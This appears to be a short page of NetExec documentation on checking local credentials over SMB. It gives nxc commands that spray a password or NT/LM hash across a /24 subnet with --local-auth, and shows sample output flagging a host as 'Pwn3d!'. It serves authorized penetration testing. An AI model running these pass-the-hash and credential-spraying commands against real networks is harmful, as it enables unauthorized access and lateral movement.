# Checking credentials (Local)

### User/Password/Hashes

Adding `--local-auth` to any of the authentication commands with attempt to logon locally.

```bash
nxc smb $TARGET/24 -u $USER -p $PASSWORD --local-auth
nxc smb $TARGET/24 -u $USER -p $PASSWORD --local-auth
nxc smb $TARGET/24 -u $USER -H $LM_HASH:$NT_HASH --local-auth
nxc smb $TARGET/24 -u $USER -H $NT_HASH --local-auth
nxc smb $TARGET/24 -u $USER -H $NT_HASH --local-auth
nxc smb $TARGET/24 -u $USER -H $LM_HASH:$NT_HASH --local-auth
```

Results will display the hostname next to the user:password

```bash
	SMB         192.168.1.101    445    HOSTNAME          [+] HOSTNAME\Username:Password (Pwn3d!)  
```
